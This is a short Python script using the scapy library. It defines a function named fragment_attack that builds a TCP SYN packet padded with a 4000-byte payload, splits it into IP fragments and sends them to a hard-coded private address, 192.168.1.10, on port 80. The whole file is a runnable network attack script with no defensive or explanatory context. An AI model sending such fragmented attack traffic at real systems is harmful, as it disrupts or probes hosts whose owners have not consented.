#! /usr/bin/env python3

from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send

def fragment_attack(target_ip, target_port=80):
    payload = b"A" * 4000  # long payload
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, sport=4444, flags="S")

    # Fragment the packet manually
    frags = (ip / tcp / payload).fragment(1480)
    for frag in frags:
        send(frag, verbose=False)

if __name__ == "__main__":
    fragment_attack("192.168.1.10")

